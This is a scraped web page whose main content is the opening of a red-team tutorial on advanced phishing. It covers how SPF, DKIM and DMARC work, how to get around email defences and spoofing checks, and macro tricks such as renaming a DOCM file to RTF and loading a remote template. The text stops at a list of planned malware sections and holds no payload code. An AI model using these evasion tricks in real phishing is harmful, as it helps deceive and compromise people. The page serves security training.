no-children"><a href="../../category/tools/web-proxies-and-web-scanners/wfuzz.html" title="Category: Wfuzz" id="category-link-188" class="category-linkitem tier-3 no-arrow " >Wfuzz</a></li></ul></li></ul><li class="category-listitem tier-1 has-children"><a href="index.html#" title="Category: Tradecraft" id="category-link-84" class="category-linkitem tier-1 has-arrow " >Tradecraft</a><ul class="level_2"><li class="category-listitem tier-2 no-children"><a href="../../category/tradecraft/automation.html" title="Category: Automation" id="category-link-122" class="category-linkitem tier-2 no-arrow " >Automation</a><li class="category-listitem tier-2 no-children"><a href="../../category/tradecraft/remote-code-execution.html" title="Category: Remote Code Execution" id="category-link-180" class="category-linkitem tier-2 no-arrow " >Remote Code Execution</a><li class="category-listitem tier-2 has-children"><a href="index.html#" title="Category: Transfer Files" id="category-link-85" class="category-linkitem tier-2 has-arrow " >Transfer Files</a><ul class="level_3"><li class="category-listitem tier-3 no-children"><a href="../../category/tradecraft/transfer-files/netcat.html" title="Category: Netcat" id="category-link-86" class="category-linkitem tier-3 no-arrow " >Netcat</a></li></ul><li class="category-listitem tier-2 no-children"><a href="../../category/tradecraft/windows-credential-dumping.html" title="Category: Windows Credential Dumping" id="category-link-124" class="category-linkitem tier-2 no-arrow " >Windows Credential Dumping</a></li></ul><li class="category-listitem tier-1 no-children"><a href="../../category/tutorial/index.html" title="Category: Tutorial" id="category-link-127" class="category-linkitem tier-1 no-arrow " >Tutorial</a><li class="category-listitem tier-1 has-children"><a href="index.html#" title="Category: Web Applications" id="category-link-129" class="category-linkitem tier-1 has-arrow " >Web Applications</a><ul class="level_2"><li class="category-listitem tier-2 no-children"><a href="../../category/web-applications/sql-injection.html" title="Category: SQL Injection" id="category-link-185" class="category-linkitem tier-2 no-arrow " >SQL Injection</a></li></ul><li class="category-listitem tier-1 has-children"><a href="index.html#" title="Category: Web Servers" id="category-link-181" class="category-linkitem tier-1 has-arrow " >Web Servers</a><ul class="level_2"><li class="category-listitem tier-2 no-children"><a href="../../category/web-servers/internet-information-services-iis.html" title="Category: Internet Information Services (IIS)" id="category-link-187" class="category-linkitem tier-2 no-arrow " >Internet Information Services (IIS)</a></li></ul></li></ul></nav>
+    </div>
+</section>
+<script type="text/javascript" src="../../static/menu/metismenu-3.0.5/dist/metisMenu.js"></script>
+<script language="JavaScript">  
+    $(document).ready(function() {
+
+        $( "ul.level_1" ).metisMenu({
+            // enabled/disable the auto collapse.
+            toggle:false,
+            // prevent default event
+            preventDefault:true,
+            // default classes
+            activeClass:'current_page',
+            collapseClass:'collapse',
+            collapseInClass:'in',
+            collapsingClass:'collapsing',
+            // .nav-link for Bootstrap 4
+            triggerElement:'a',
+            // .nav-item for Bootstrap 4
+            parentTrigger:'li',
+            // .nav.flex-column for Bootstrap 4
+            subMenu:'ul'
+        });
+
+        // Expands menu tree up to current_page
+        $('.metismenu').find('a.current_page').parents('ul').siblings('a').attr('aria-expanded', 'true');
+        $('.metismenu').find('a.current_page').parents('li').addClass( 'mm-active');
+        $('.metismenu').find('a.current_page').parents('ul').removeAttr('style').addClass('mm-show');
+
+        $( window ).resize(function() {
+            if( $( window ).width() >= 760 ){
+                $('#navbarSupportedContent').attr('style','');
+                $('#navbarSupportedContent').addClass('in');
+                $('#navbarSupportedContent').attr('aria-expanded','true');
+            }
+        });
+
+        if( $( window ).width() <= 760 ){
+            $('#navbarSupportedContent').removeClass('in');
+        }
+
+    });
+</script>
+<!-- CATEGORY SECTION END -->
+
+					
+<!----TAG SECTION START------->
+<section class="tag-section">
+<h2 class="sidebar-heading tag-heading">Tag<span class="line"></span></h2>
+	<ul>
+		
+			<li><a href="../../tag/ssl.html"  title="SSL">SSL</a></li>
+		
+			<li><a href="../../tag/tls.html"  title="TLS">TLS</a></li>
+		
+			<li><a href="../../tag/powershell.html"  title="PowerShell">PowerShell</a></li>
+		
+			<li><a href="../../tag/linux.html"  title="Linux">Linux</a></li>
+		
+			<li><a href="../../tag/windows.html"  title="windows">windows</a></li>
+		
+			<li><a href="../../tag/enumeration.html"  title="Enumeration">Enumeration</a></li>
+		
+			<li><a href="../../tag/cloud.html"  title="cloud">cloud</a></li>
+		
+			<li><a href="../../tag/kali-linux.html"  title="kali linux">kali linux</a></li>
+		
+			<li><a href="../../tag/error-message.html"  title="error message">error message</a></li>
+		
+			<li><a href="../../tag/docker.html"  title="Docker">Docker</a></li>
+		
+			<li><a href="../../tag/smb.html"  title="SMB">SMB</a></li>
+		
+			<li><a href="../../tag/active-directory.html"  title="Active Directory">Active Directory</a></li>
+		
+			<li><a href="../../tag/wsl2.html"  title="wsl2">wsl2</a></li>
+		
+			<li><a href="../../tag/openssl.html"  title="OpenSSL">OpenSSL</a></li>
+		
+			<li><a href="../../tag/ike.html"  title="IKE">IKE</a></li>
+		
+			<li><a href="../../tag/vms.html"  title="VMs">VMs</a></li>
+		
+			<li><a href="../../tag/red-teaming.html"  title="Red Teaming">Red Teaming</a></li>
+		
+			<li><a href="../../tag/database.html"  title="Database">Database</a></li>
+		
+			<li><a href="../../tag/ssh.html"  title="SSH">SSH</a></li>
+		
+			<li><a href="../../tag/aws.html"  title="aws">aws</a></li>
+		
+			<li><a href="../../tag/isakmp.html"  title="ISAKMP">ISAKMP</a></li>
+		
+			<li><a href="../../tag/rtf.html"  title="rtf">rtf</a></li>
+		
+			<li><a href="../../tag/winrm.html"  title="WinRM">WinRM</a></li>
+		
+			<li><a href="../../tag/ffmpeg.html"  title="ffmpeg">ffmpeg</a></li>
+		
+			<li><a href="../../tag/crime.html"  title="CRIME">CRIME</a></li>
+		
+	</ul>
+</section>
+<!----TAG SECTION END------->
+
+					
+
+<!----ABOUT SECTION START------->
+<section class="about-section">
+	<h3 class="sidebar-heading">About Me<span class="line"></span></h3>
+	<div class="content">
+		<img src="../../static/images/evilsaint-high_res.png" alt="EvilSaint" title="EvilSaint">
+		<p>
+			Cyber security researcher, ethical hacker, Capture the Flag enthusiast, developer and, automater of repetative tasks.
+			I spend my time consuming four to six books a month on security, technololgy, psychology, learning and productivity.  
+			Not to mention I am always doing a course or certificate! This website covers all these topics; some in greater depth than others!
+		</p>
+		<a href="../../about/index.html">Read more</a>
+	</div>
+</section>
+<!----ABOUT SECTION END------->
+
+					
+<!---- NEWSLETTER START ---->
+<section class="newsletter-section">
+	<h2 class="heading">let's get connected!</h2>
+	<p class="lead">Every fortnight, I send out a single email with exciting reads, videos and tools I have discovered. It is free! No spam! Unsubscribe whenever you want. Simply sign-up and ring the door bell.</p>
+	<div class="form-group has-feedback" id="newsletter">
+		<div id="signup-status-message" class="alert alert-success" role="alert" style="display:none;">
+			Thank You For Joining!
+		</div>
+        <ul id="error-message" class="errorlist" style="display:none;"><li>Sorry, problems with our email servers. Please try again later.</li></ul>
+
+        <form method="POST" action="http://evilsaint.com/subscribe/" id="newsletter-form" >
+            <input type="hidden" name="csrfmiddlewaretoken" value="ET9YXVr5xDDWpKHRLLMiGrKIF5o1EH9WlLhXEQ32g7U9QNiNkxTBiqieJAvG1MHt">
+            <input type="text" name="name" maxlength="25" class="form-control mb-3" placeholder="Enter Your Name" id="id_name">
+            <input type="email" name="email" maxlength="70" class="form-control mb-3" placeholder="Enter Your Email Address" required id="id_email">
+            <div id="captchacontrols" style="display:none">
+                <p>Enter the <em><bold>default</bold></em> port number for the following service using your number keypad.</p>
+                <ul id="wrong-captcha-message" class="errorlist" style="display:none;"><li>Sorry, wrong capcha. Please try again.</li></ul>
+                <img class="captcha me-2" src="../../captcha/image/f74ea53895d7c2c87959fb3ce3662c82b14d7a3d/index.html" alt="captcha"><input type="hidden" name="captcha_0" value="f74ea53895d7c2c87959fb3ce3662c82b14d7a3d" class="form-control mb-3 mt-3" placeholder="Captcha Answer" required id="id_captcha_0"><input type="text" name="captcha_1" class="form-control mb-3 mt-3" placeholder="Captcha Answer" required id="id_captcha_1" autocapitalize="off" autocomplete="off" autocorrect="off" spellcheck="false">
+	    </div>
+            <input id="signup-bell" type="image" src="../../static/images/doorbell.png" value="signup" height=64 width=64>
+        </form>
+	</div>
+    <script src="../../static/js/newsletter.js"></script>
+</section>
+<!----NEWSLETTER END------->
+
+				</div>
+                <!----  SIDEBAR CONTENT END  ---->
+			</aside>
+            <!----  SIDEBAR MAIN END  ---->
+		</div>
+        <!----  LEFT SIDEBAR GRID END  ---->
+        <!---- RIGHT CONTENT START ---->
+		<div class="col-12 col-sm-9 col-md-9 col-lg-9 right-section">
+			<div class="content-main-section">
+				<!---- HEADER START ---->
+                <header>
+					<div class="row">
+						
+
+	<!---- SEARCH BAR START ---->
+	<div class="col-sm-12 col-md-12 col-lg-12 col-xs-12">
+		<div class="row">
+			<div class="form-group has-feedback search-box-header col-sm-6 col-md-6 col-lg-6 col-xs-6 pt-1">
+				
+<form method="POST" action="http://evilsaint.com/search/" id="search-form" > 
+	<div class="search-wrapper">
+		<input type="hidden" name="csrfmiddlewaretoken" value="ET9YXVr5xDDWpKHRLLMiGrKIF5o1EH9WlLhXEQ32g7U9QNiNkxTBiqieJAvG1MHt">
+		<span class="glyphicon glyphicon glyphicon-search form-control-feedback"></span>
+		<span id="search-box-wrapper">
+			<input type="text" class="form-control" name="search" id="search-box" placeholder="Search..." autocomplete="off"> 
+		</span>
+		<div id='search_results' style="display:none;">
+
+		</div>
+	</div>
+</form>
+
+<script language="JavaScript">
+	$(document).ready(function() {
+
+		$('#search-box').focus(function(e){
+			$(this).val("")
+		});
+
+		$(document).keyup(function(e) {
+  			if (e.keyCode === 27) $('#search_results').hide()  // esc
+		});
+
+
+		$('#search-box').keyup(function(e) { // catch the form's submit event
+			e.preventDefault()
+			$.ajax({ // create an AJAX call...
+				data: $('#search-form').serialize(), // get the form data
+				type: 'POST', // GET or POST
+				url: '/search/', // the file to call
+				success: function(response) { // on success..
+
+					if($('#search-box').val().length > 2){
+					
+						$("#search_results").show();
+						html = "<div>"
+
+						html += '<div><h3>Articles</h3></div>'
+						articles = response['results']['articles']
+						if( articles.length > 0 ){
+							for (const [key, value] of Object.entries(articles)) {
+								console.log(value)
+								html += '<div>'
+								html += '<h4><a href="http://evilsaint.com/article/advanced-phishing-tactics/'&#32;+&#32;value.url&#32;+&#32;'">' + value.title + '</a></h4>'
+								html += '<p>' + value.content + '</p>'
+								html += '</div>'
+							}
+						}else{
+							html += '<p>No articles for this search term</p>'
+						}
+
+
+						html += '<div><h3>Posts</h3></div>'
+						posts = response['results']['posts']
+						if( posts.length > 0 ){
+							for (const [key, value] of Object.entries(posts)) {
+								html += '<div>'
+								html += '<h4><a href="http://evilsaint.com/article/advanced-phishing-tactics/'&#32;+&#32;value.url&#32;+&#32;'">' + value.title + '</a></h4>'
+								html += '<p>' + value.content + '</p>'
+								html += '</div>'
+							}
+						}else{
+							html += '<p>No posts for this search term</p>'
+						}
+
+
+						html += '<div><h3>Tutorials</h3></div>'
+						tutorials = response['results']['tutorials']
+						if( tutorials.length > 0 ){
+							for (const [key, value] of Object.entries(tutorials)) {
+								html += '<div>'
+								html += '<h4><a href="http://evilsaint.com/article/advanced-phishing-tactics/'&#32;+&#32;value.url&#32;+&#32;'">' + value.title + '</a></h4>'
+								html += '<p>' + value.content + '</p>'
+								html += '</div>'
+							}
+						}else{
+							html += '<p>No tutorials for this search term</p>'
+						}
+
+						html += '<div><h3>Capture The Flags</h3></div>'
+						ctfs = response['results']['ctfs']
+						if( ctfs.length > 0 ){
+							for (const [key, value] of Object.entries(ctfs)) {
+								html += '<div>'
+								html += '<h4><a href="http://evilsaint.com/article/advanced-phishing-tactics/'&#32;+&#32;value.url&#32;+&#32;'">' + value.title + '</a></h4>'
+								html += '<p>' + value.content + '</p>'
+								html += '</div>'
+							}
+						}else{
+							html += '<p>No Caputure The Flags for this search term</p>'
+						}
+
+
+						html += '</div>'
+						$('#search_results').html(html).delay(1000)
+
+						$('#search_results').mouseenter(function(){
+							$('#search_results').mouseleave(function(e){
+								$('#search_results').hide()
+							});
+						});
+
+						$('div.search-wrapper').mouseleave(function(){
+							$('#search_results').hide()
+						});
+
+					}else{
+						$("#search_results").hide();
+					}
+
+				}
+			});
+			return false;
+		});
+	});
+</script>
+
+			</div>
+			<!----  SEARCH BAR END  ---->
+			<!----  MOBILE SEARCH START  ---->
+							
+			<nav class="navbar navbar-expand-lg navbar-light mobile-mnu">
+				<div class="row">
+					<div class="col-sm-6 col-md-6 col-lg-6 col-xs-6">
+						<a href="../../index.html">
+							<img src="../../static/images/ES-Wordmark.png" alt="EvilSaint Wordmark" class="img-responsive">
+						</a>
+					</div>
+					<div class="search-mob col-sm-2 col-md-2 col-lg-2 col-xs-2">
+						<!--<svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" class="bi bi-search" id="search-btn" viewBox="0 0 16 16">
+						  <path d="M11.742 10.344a6.5 6.5 0 1 0-1.397 1.398h-.001c.03.04.062.078.098.115l3.85 3.85a1 1 0 0 0 1.415-1.414l-3.85-3.85a1.007 1.007 0 0 0-.115-.1zM12 6.5a5.5 5.5 0 1 1-11 0 5.5 5.5 0 0 1 11 0z"/>
+						</svg>--><img id="search-btn" src="../../static/images/search_icon.png">
+						
+					</div>
+					<div class="col-sm-2 col-md-2 col-lg-2 col-xs-2">
+						<a id="avatar-profile-login" href="../../accounts/login/index.html">
+							<button class="btn esbtn_blue">Log In</button>
+						</a>
+					</div>
+					<div class="col-sm-2 col-md-2 col-lg-2 col-xs-2">
+						<button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+							<span class="navbar-toggler-icon"></span>
+						</button>
+					</div>
+				</div>
+				
+			</nav>
+			<div class="header-search-from-mob">
+				<form action="http://evilsaint.com/search/">
+					<input type="text" placeholder="Search.." name="search">
+					<button type="submit"><img src="../../static/images/search_icon.png"></button>
+				</form>
+			</div>
+			<script>
+				jQuery(document).ready(function(){
+					jQuery('#search-btn').click(function() {
+						jQuery('.header-search-from-mob').toggle();
+						jQuery(this).toggleClass('show');
+						return false;
+					})
+				});		
+			</script>			
+			<!----  MOBILE SEARCH END  ---->
+			<!---- SOCIAL MEDIA AND RIGHT LOGO START ---->
+			<div class="social-icon col-sm-2 col-md-2 col-lg-2 col-xs-2">
+				
+<a href="https://www.youtube.com/c/EvilSaintEthicalHacking">
+    <i class="fab fa-youtube"></i>
+</a>
+<a href="https://www.facebook.com/TheEvilSaint/">
+    <i class="fab fa-facebook"></i>
+</a>
+<a href="https://www.twitter.com/_evilsaint_/">
+    <i class="fab fa-twitter"></i>
+</a>
+<a href="https://www.instagram.com/therealevilsaint/">
+    <i class="fab fa-instagram"></i>
+</a>
+
+			</div>
+			<div class="col-sm-2 col-md-2 col-lg-2 col-xs-2">
+				
+
+
+<a id="avatar-profile-login" href="../../accounts/login/index.html">
+  <button class="btn esbtn_blue">Log In</button>
+</a>
+
+			</div>
+			<div class="right-header-image col-sm-2 col-md-2 col-lg-2 col-xs-2 pt-1">
+				<a href="../../index.html">
+					<img src="../../static/images/ES-Wordmark.png" alt="EvilSaint Wordmark" class="img-responsive">
+				</a>
+			</div>
+		</div>
+	</div>
+	<!----  SOCIAL MEDIA AND RIGHT LOGO END  ---->
+
+					</div>
+				</header>
+                <!----  HEADER END  ---->
+				<div class="row">
+                    <!---- MIDDLE CONTENT GRID START ---->
+                    
+<div class="col-11">
+    
+<!---- ARTICLE START ---->
+<div class="content-section content-section-light">
+    <div class="row">
+    <div class="col-sm-12 text-end">
+        <a id="theme-switcheroo" title="Theme switcheroo">
+            <input type="checkbox">
+        </a>
+        <script>
+            var theme,
+                def_theme_class = "content-section-light",
+                alt_theme_class = "content-section-dark";
+            $( document ).ready(
+                function() {
+                    if ( $( ".content-section" ).hasClass( alt_theme_class )) {
+                        $( "#theme-switcheroo > input" ).prop( "checked", true );
+                    }
+                        
+                    $( "#theme-switcheroo" ).click(
+                        function(e) {
+                            if ( $( "#theme-switcheroo > :checked" ).length == 1 ) {
+                                $( ".content-section" ).addClass( alt_theme_class ).removeClass( def_theme_class );
+                                theme = "dark";
+                            } else {
+                                $( ".content-section" ).addClass( def_theme_class ).removeClass( alt_theme_class );
+                                theme = "light";
+                            }
+
+                            $.ajax({
+                                data: {
+                                    "csrfmiddlewaretoken": "ET9YXVr5xDDWpKHRLLMiGrKIF5o1EH9WlLhXEQ32g7U9QNiNkxTBiqieJAvG1MHt",
+                                    "theme": theme
+                            },
+                                method: "POST"
+                            });
+                        }
+                    );
+                }
+            );
+        </script>
+    </div>
+</div>
+
+    <div class="row">
+		<div class="col-sm-2 col-xs-3">
+			
+				<img src="../../media/articles/images/advanced-phishing-tactics/icon_image/advanced_phishing_icon.png" class="content_icon img-responsive" >
+			
+		</div>
+		<div class="col-sm-10 col-xs-9">
+            
+
+
+
+
+
+
+<h1 class="title-main" title="Post Title">Advanced Phishing Tactics</h1>
+
+
+
+
+
+<div class="post-publish"><span title="Published On" class="date publish"><i class="fas fa-calendar-alt"></i>  17 Aug 2021, 2:57 p.m.</span></div>
+
+
+
+<div class="post-date"><span title="Updated On" class="date updated"><i class="fas fa-calendar-plus"></i>  3 Dec 2021, 8:58 a.m.</span></div>
+
+
+
+<div class="post-time">
+    <span title="Reading Time" class="date reading-time">
+        <i class="fas fa-stopwatch"></i>  36:08 minutes
+    </span>
+</div>
+<div class="clear"></div>
+
+
+
+<div><span title="Tags" class="tags tags"><i class="fas fa-tags"></i> 
+    
+        <a href="../../tag/red-teaming.html" class="active tagsize-" title="Red Teaming">Red Teaming</a>
+    
+</span></div>
+
+
+
+
+		</div>
+	</div>
+    <hr>
+    
+        <img class="content_banner_image img-responsive" src="../../media/articles/images/advanced-phishing-tactics/cover_image/advanced_phishing.jpg" />
+    
+    <div class="row gx-1 overflow-hidden">
+        <div class="col-xs-11 col-sm-11 col-lg-12 p-1">
+    		
+                <div class="accordion my-4" id="tldr">
+    <div class="accordion-item">
+        <h2 class="accordion-header" id="tldr-header">
+            <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#tldr-content" aria-expanded="false" aria-controls="tldr-content">TL;DR</buttton>
+        </h2>
+        <div id="tldr-content" class="accordion-collapse collapse" aria-labelledby="tldr-header" data-bs-parent="#tldr">
+            <div class="accordion-body mx-3">This is the article summary at the top</div>
+        </div>
+    </div>
+</div>
+
+    		
+            
+<div class="accordion mb-4" id="toc">
+    <div class="accordion-item">
+        <h2 class="accordion-header" id="toc-header">
+            <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#toc-content" aria-expanded="false" aria-controls="toc-content"><i class="fa fa-list-ul"></i></buttton>
+        </h2>
+        <div id="toc-content" class="accordion-collapse collapse" aria-labelledby="toc-header" data-bs-parent="#toc">
+            <div class="accordion-body">
+                <ul data-toc="#content" data-toc-headings="h2,h3,h4,h5,h6"></ul>
+            </div>
+        </div>
+    </div>
+</div>
+<script src="../../static/js/jquery.toc.min.js"></script>
+
+            <div id="content" class="content">
+                <p>Emails are one of the few technologies that almost everyone, technical or non-technical, is familiar with.  Even the most security-aware organisations, whose network and endpoint security is robust, are usually fairly relaxed about email. There is no doubt that phishing remains the top threat vector for cyber attacks. Attacking the human factor continues to be the most attractive and successful path for gaining an initial foothold. For this reason, cybercriminals, as well as nation-state actors, utilise phishing attacks. </p>
+<p>Recently, there has been a rapid and dramatic shift from board spam attacks to spear-phishing attacks, which can cause significant financial brand and operational damage.</p>
+<ul>
+<li>32% of confirmed data breaches involved phishing </li>
+<li>62% of businesses experienced phishing, and social engineering attacks in 2019</li>
+<li>65% of APT groups use spear-phishing as the primary infection vector </li>
+<li>56% of IT decision-makers believe phishing attacks are their top security threat</li>
+</ul>
+<p>Sophisticated attackers use spear-phishing emails as their tool of choice, because spear-phishing attacks open the door for further infiltration into any network accessible by the victim. Those targeted attacks usually contain various offensive techniques, such as ransomware, sender impersonation, credential, phishing and typosquatting. Spear-phishing has been associated with the most significant cyberattacks in recent history, including widely publicised attacks on companies, such as JP Morgan Chase and Co. E-Bay, Target, Anthem, Sony and various departments within the US government. </p>
+<p>When delivering an adversary simulation test, it is of great importance to have the ability to execute advanced social engineering attacks. Social engineering attacks are proven to be highly effective and can be pretty stealthy if executed correctly. Since this tutorial will present the red team approach, massive phishing campaigns are out of the equation. In this tutorial, we will focus on advanced spear-phishing attacks and customised client-side attack vectors. </p>
+<p>There is a common misconception about phishing; this misconception alludes that phishing is relatively easy to implement and does not require much preparation. In fact, several standards exist to reinforce secure email delivery and prevent message spoofing. Fortunately for a penetration tester, these standards pose an obstacle that can be bypassed with appropriate preparation. The first weakness is that these protective standards are not evenly implemented across all networks and, with a bit of knowledge of the specifics, we can avoid triggering countermeasures.</p>
+<h2>Sender Policy Framework</h2>
+<p>When we connect to a mail server and send the MAIL FROM command, we claim the message is from the address we provide, and SMTP does not have a way to verify this claim.</p>
+<p>Sender Policy Framework, or SPF, is a standard to verify this claim. To take advantage of SPF, the owner of a domain publishes a list of authorised sending hosts in the domain name system (DNS) records for that domain. These SPF records are in the form of a specially formatted TXT record.</p>
+<p>When SPF is configured and we are trying to relay a message through the mail server, the mail server will check the SPF record on the domain. If an SPF record exists and our IP address is not listed in the record, there is a good chance that the mail server will reject our message. It is important to note that SPF does not verify the message headers. For SPF to operate as intended, both the following actions need to be implemented. </p>
+<ul>
+<li>The mail server that receives a message must verify the SPF record.</li>
+<li>The domain owner must create an SPF record. </li>
+</ul>
+<p>To look up the SPF record for the domain, we can use the &ldquo;dig&rdquo; command.</p>
+<div class="codehilite"><pre><span></span><code>dig +short TXT domain
+</code></pre></div>
+
+<p>Below is an example of a query against microsoft.com. </p>
+<div class="codehilite"><pre><span></span><code><span class="nv">dig</span> <span class="o">+</span><span class="nv">short</span> <span class="nv">TXT</span> <span class="nv">microsoft</span>.<span class="nv">com</span>
+
+<span class="s2">&quot;</span><span class="s">docusign=d5a3737c-c23c-4bd0-9095-d2ff621f2840</span><span class="s2">&quot;</span>
+<span class="s2">&quot;</span><span class="s">v=spf1 include:_spf-a.microsoft.com include:_spf-b.microsoft.com include:_spf-c.microsoft.com include:_spf-ssg-a.microsoft.com include:spf-a.hotmail.com include:_spf1-meo.microsoft.com -all</span><span class="s2">&quot;</span>
+<span class="s2">&quot;</span><span class="s">google-site-verification=Zv1IvEEZg4N9wbEXpBSSyAiIjDyyB3S-fzfFClb7D1E</span><span class="s2">&quot;</span>
+<span class="s2">&quot;</span><span class="s">adobe-sign-verification=c1fea9b4cdd4df0d5778517f29e0934</span><span class="s2">&quot;</span>
+<span class="s2">&quot;</span><span class="s">docusign=52998482-393d-46f7-95d4-15ac6509bfdd</span><span class="s2">&quot;</span>
+<span class="s2">&quot;</span><span class="s">google-site-verification=8-zFCaUXhhPcvN29EVw2RvtASDCaDPQ02L1HJ8Om8I0</span><span class="s2">&quot;</span>
+<span class="s2">&quot;</span><span class="s">adobe-idp-site-verification=8aa35c528af5d72beb19b1bd3ed9b86d87ea7f24b2ba3c99ffcd00c27e9d809c</span><span class="s2">&quot;</span>
+<span class="s2">&quot;</span><span class="s">d365mktkey=4d8bnycx40fy3581petta4gsf</span><span class="s2">&quot;</span>
+<span class="s2">&quot;</span><span class="s">8RPDXjBzBS9tu7Pbysu7qCACrwXPoDV8ZtLfthTnC4y9VJFLd84it5sQlEITgSLJ4KOIA8pBZxmyvPujuUvhOg==</span><span class="s2">&quot;</span>
+<span class="s2">&quot;</span><span class="s">google-site-verification=1TeK8q0OziFl4T1tF-QR65JkzHZ1rcdgNccDFp78iTk</span><span class="s2">&quot;</span>
+<span class="s2">&quot;</span><span class="s">d365mktkey=3uc1cf82cpv750lzk70v9bvf2</span><span class="s2">&quot;</span>
+<span class="s2">&quot;</span><span class="s">facebook-domain-verification=fwzwhbbzwmg5fzgotc2go51olc3566</span><span class="s2">&quot;</span>
+<span class="s2">&quot;</span><span class="s">apple-domain-verification=0gMeaYyYy6GLViGo</span><span class="s2">&quot;</span>
+<span class="s2">&quot;</span><span class="s">google-site-verification=pjPOauSPcrfXOZS9jnPPa5axowcHGCDAl1_86dCqFpk</span><span class="s2">&quot;</span>
+<span class="s2">&quot;</span><span class="s">fg2t0gov9424p2tdcuo94goe9j</span><span class="s2">&quot;</span>
+</code></pre></div>
+
+<h2>DKIM</h2>
+<p>SPF is not capable of verifying message content. DKIM is the standard to verify message content.</p>
+<p>DKIM stands for DomainKeys Identified Mail; a mail server utilises this mechanism to sign a message and its contents so others can confirm that it originated from that server. The message signing process is carried out using a DKIM-signature header.</p>
+<p>The verification process starts with a server querying the domain Public Key through DNS to identify if the message originated from that domain (or not).</p>
+<p>For DKIM to operate as intended, cooperation between the domain owner and a mail provider must occur so that a message lacking the domain-specific DKIM-signature header is marked as something suspicious. </p>
+<p>Insert example of DKIM lookup using dig. </p>
+<p>The lack of a DKIM header does not mean a message is valid or invalid, and this is why DKIM requires tight cooperation between all email receivers and senders to be effective; by no means is this a manageable solution. This situation is where DMARC comes in.</p>
+<h2>DMARC</h2>
+<p>DMARC, or Domain-based Message Authentication Reporting and Conformance, is a standard that enables a domain owner to announce a domain is protected under either DKIM, SPF or both, and advises other mail servers about the actions to take in case a message fails a check. If the email fails the check, depending on the instructions held within the DMARC record, the email could be delivered, quarantined or rejected.</p>
+<p>To check a domain for uses DMARC, use the &ldquo;dig&rdquo; command to look up a TXT record for _dmarc.domain.com. </p>
+<p>DMARC will be effective only if the message receiving server checks for the record and acts upon it. The same applies to SPF and DKIM. Users are left exposed to spoofing attacks if a mail server does not actively look for and act on these countermeasures.</p>
+<h2>Accepted Domains</h2>
+<p>Without DMARC, SPF and DKIM, verifying whether a mail is a spoofing attempt is not easy. If an organisation has a crystal clear understanding of the domain owners, another protection mechanism can prevent the spoofing of a local user. This mechanism is the Accepted Domains Feature in Microsoft Exchange. </p>
+<h2>Spam Traps</h2>
+<p>The following is a list of factors and email components that are considered while evaluating email received. </p>
+<ul>
+<li>Domains age </li>
+<li>Links pointing to an IP address </li>
+<li>Link manipulation techniques</li>
+<li>Suspicious and uncommon attachments</li>
+<li>Broken email content </li>
+<li>Values used that are different to those on the mail headers</li>
+<li>Existence of a valid and trusted SSL certificate </li>
+<li>Submission of the page to a web content filtering site</li>
+</ul>
+<h2>Circumventing Defences</h2>
+<p>In summary, when planning to spoof a message from a domain, it would be prudent to check if the domain has an SPF, DKIM or DMARC record. </p>
+<p>Send a message to a non-existing user and analyse the non-delivery notice message headers for critical information. If spoofing is not an option, try the legitimate approach; register a domain that suits the social engineering campaign context and correctly set SPF, DKIM and DMARC records.</p>
+<h2>Macros Containing Documents</h2>
+<p>Visual Basic for Applications code can be embedded within Microsoft Office files to automate processes and access Windows APIs, allowing access to low-level functionality from inside those files. This Microsoft feature got abused by computer viruses in the late 1990s; mainly due to its powerful functionality and the fact that Office file macros were automatically executed by default. As of MS Office 2003, this behaviour was altered. Macros were no longer executed automatically when an office file was loaded, and a GUI prompt would pop up informing users of a macro presence inside the file. MS Office 2007 pushed macro security further; macros could not be embedded within the default MS Word document file. This effort was facilitated by the Open Office XML standard, based on which Microsoft introduced four distinct formats.</p>
+<p>The following Microsoft Word formats were introduced:</p>
+<ul>
+<li>DOCX - Compressed Document - Macros Not Permitted</li>
+<li>DOTX - Compressed Template - Macros Not Permitted</li>
+<li>DOCM - Compressed Document - Macros Permitted</li>
+<li>DOTM - Compressed Template - Macros Permitted</li>
+</ul>
+<p>Microsoft Windows uses the file extension to determine the software that will handle the opening of a file once it is clicked. When Microsoft Office is installed, the above extensions are associated with it. Subsequently, all of the above file types will be handled by Microsoft Word. Microsoft Word performs file data validation before opening the file against the Office Open XML standard. The validation is performed by an MS office DLL (filename WWLIB.DLL). The filename extension plays no role in this data validation process. If any error is identified during the data structure validation of the analysed file, it will not be opened.</p>
+<p>It should be noted that DOCM files containing macros can be renamed as other file formats by changing the file extension and still keep their macro executing capabilities. For example, an RTF file does not support macros by design; but a DOCM file renamed to RTF will be handled by Microsoft Word and be capable of macro execution. The same internals or mechanisms apply to all software of the Microsoft Office Suite, namely Excel, Word and Powerpoint. The following commands will show what files are associated with Office programs and find extensions capable of executing macros. </p>
+<div class="codehilite"><pre><span></span><code>assoc | findstr /i &quot;word&quot;
+assoc | findstr /i &quot;excel&quot;still
+assoc | findstr /i &quot;powerp&quot;
+</code></pre></div>
+
+<p>There is an exception regarding the macro fundamentals we have covered, a remote template in the DOCX Files. </p>
+<p>DOCX files, referencing a template that includes macros, can execute macros as well. We can reference our remote template by executing the following steps. </p>
+<div class="codehilite"><pre><span></span><code><span class="k">File</span><span class="w"> </span><span class="n">options</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="k">Add</span><span class="o">-</span><span class="n">ins</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="nl">Manage</span><span class="p">:</span><span class="w"> </span><span class="n">Templates</span><span class="w"> </span><span class="k">Go</span><span class="p">.</span><span class="w"> </span>
+</code></pre></div>
+
+<h2>Attack vector development</h2>
+<p>Although we want to showcase the red team perspective in this tutorial, where the on-disk footprint should be kept to a minimum to be thorough, we will also cover techniques where our malware touches the disk. As far as attack vectors are concerned, we will follow the custom-made and multi-stage approach. This approach will decrease the chances of a defence mechanism identifying us and make the analyst work harder.</p>
+<p>In the coming sections, we will develop our own custom attack vectors for use in advanced social engineering engagements. Specifically, the following techniques will be covered.</p>
+<ul>
+<li>Custom macro development </li>
+<li>Custom actions </li>
+<li>OLE objects</li>
+<li>Chaining Excel DDE with MS16-035 </li>
+<li>Uncommon extensions in social engineering </li>
+<li>Custom job script backdoor development</li>
+<li>Custom beaconing malware development</li>
+<li>Custom click once application development</li>
+</ul>
